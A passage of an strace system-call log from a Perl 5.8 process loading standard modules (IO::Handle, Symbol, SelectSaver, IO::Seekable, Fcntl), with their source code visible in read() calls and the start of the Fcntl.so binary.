do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
8463  07:23:33.120691 stat64("/etc/perl/Symbol.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.120730 stat64("/etc/perl/Symbol.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.120821 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc",  <unfinished ...>
8461  07:23:33.120873 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
8463  07:23:33.120898 <... stat64 resumed> 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8461  07:23:33.120905 <... rt_sigprocmask resumed> NULL, 8) = 0
8461  07:23:33.120942 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
8463  07:23:33.120950 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.120984 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc",  <unfinished ...>
8461  07:23:33.121010 <... rt_sigprocmask resumed> [], 8) = 0
8461  07:23:33.121019 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
8463  07:23:33.121026 <... stat64 resumed> 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8461  07:23:33.121032 <... rt_sigprocmask resumed> NULL, 8) = 0
8463  07:23:33.121038 stat64("/usr/local/share/perl/5.8.8/Symbol.pm",  <unfinished ...>
8461  07:23:33.121066 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
8463  07:23:33.121090 <... stat64 resumed> 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8461  07:23:33.121114 <... rt_sigprocmask resumed> [], 8) = 0
8461  07:23:33.121139 rt_sigaction(SIGINT, {0x807f150, [], 0},  <unfinished ...>
8463  07:23:33.121168 stat64("/usr/lib/perl5/Symbol.pmc",  <unfinished ...>
8461  07:23:33.121192 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
8461  07:23:33.121200 waitpid(-1,  <unfinished ...>
8463  07:23:33.121230 <... stat64 resumed> 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.121253 stat64("/usr/lib/perl5/Symbol.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.121346 stat64("/usr/share/perl5/Symbol.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.121380 stat64("/usr/share/perl5/Symbol.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.121414 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.121431 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.121450 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.121467 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
8463  07:23:33.121496 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
8463  07:23:33.121517 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2978) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.121533 _llseek(8, 0, [0], SEEK_CUR) = 0
8463  07:23:33.121559 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
8463  07:23:33.122043 read(8, "", 4096) = 0
8463  07:23:33.122060 close(8)          = 0
8463  07:23:33.122125 stat64("/etc/perl/SelectSaver.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.122142 stat64("/etc/perl/SelectSaver.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.122156 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.122169 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.122184 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.122196 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.122210 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.122222 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.122235 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.122247 stat64("/usr/share/perl5/SelectSaver.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.122261 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.122274 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.122288 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.122301 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
8463  07:23:33.122362 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
8463  07:23:33.122377 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2978) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.122405 _llseek(8, 0, [0], SEEK_CUR) = 0
8463  07:23:33.122425 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
8463  07:23:33.122550 brk(0x81d6000)    = 0x81d6000
8463  07:23:33.122581 read(8, "", 4096) = 0
8463  07:23:33.122592 close(8)          = 0
8463  07:23:33.123008 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
8463  07:23:33.123667 read(6, "", 4096) = 0
8463  07:23:33.123682 close(6)          = 0
8463  07:23:33.123760 stat64("/etc/perl/IO/Seekable.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.123778 stat64("/etc/perl/IO/Seekable.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.123807 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.123824 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.123838 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.123851 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.123865 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.123876 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.123890 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.123902 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbfbb301c) = -1 ENOENT (No such file or directory)
8463  07:23:33.123915 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbfbb310c) = -1 ENOENT (No such file or directory)
8463  07:23:33.123928 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
8463  07:23:33.123949 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
8463  07:23:33.123964 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2e28) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.123975 _llseek(6, 0, [0], SEEK_CUR) = 0
8463  07:23:33.123994 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
8463  07:23:33.124121 stat64("/etc/perl/Fcntl.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.124136 stat64("/etc/perl/Fcntl.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.124149 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.124161 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.124175 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.124187 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.124201 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.124224 stat64("/usr/lib/perl5/Fcntl.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.124265 stat64("/usr/share/perl5/Fcntl.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.124291 stat64("/usr/share/perl5/Fcntl.pm", 0xbfbb2b6c) = -1 ENOENT (No such file or directory)
8463  07:23:33.124305 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbfbb2c5c) = -1 ENOENT (No such file or directory)
8463  07:23:33.124317 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
8463  07:23:33.124338 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
8463  07:23:33.124352 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb2978) = -1 ENOTTY (Inappropriate ioctl for device)
8463  07:23:33.124377 _llseek(8, 0, [0], SEEK_CUR) = 0
8463  07:23:33.124396 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
8463  07:23:33.124770 brk(0x81f7000)    = 0x81f7000
8463  07:23:33.133004 read(8, "", 4096) = 0
8463  07:23:33.133021 close(8)          = 0
8463  07:23:33.133095 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
8463  07:23:33.133119 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
8463  07:23:33.133147 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
8463  07:23:33.133162 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
